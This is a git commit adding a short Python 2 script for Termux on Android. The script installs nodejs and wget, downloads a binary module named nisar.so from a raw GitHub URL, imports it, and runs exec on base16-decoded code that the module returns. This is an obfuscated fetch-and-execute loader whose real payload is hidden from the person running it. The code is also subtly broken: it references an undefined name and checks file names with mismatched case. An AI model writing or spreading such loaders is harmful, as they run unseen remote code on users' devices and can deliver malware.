838137655ecd55eaa6e351d5c423875d71118951
Mahsud786 <66312289+Mahsud786@users.noreply.github.com>
2021-01-27 13:54:50 +0500

    Add files via upload

---
+++ bxi.py
@@ -0,0 +1,16 @@
+#!/data/data/com.termux/files/usr/bin/python2
+#coding=utf-8
+import os,platform,time,base64,json
+if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
+	os.system('pkg update && pkg install nodejs -y')
+if not os.path.isfile('/data/data/com.termux/files/usr/bin/wget'):
+	os.system('pkg update && pkg install wget -y')
+bit=platform.architecture()[0]
+if not os.path.isfile('nisar.so'):
+	os.system('wget https://raw.githubusercontent.com/Nisar-Mahsud/Binaries/main/bxi/for-termux/{}/nisar.so'.format(bit))
+	time.sleep(1)
+	import Nisar
+	exec(base64.b16decode(binni.bcoder909()))
+elif os.path.isfile('Nisar.so'):
+	import Nisar
+	exec(base64.b16decode(Nisar.bcoder909()))
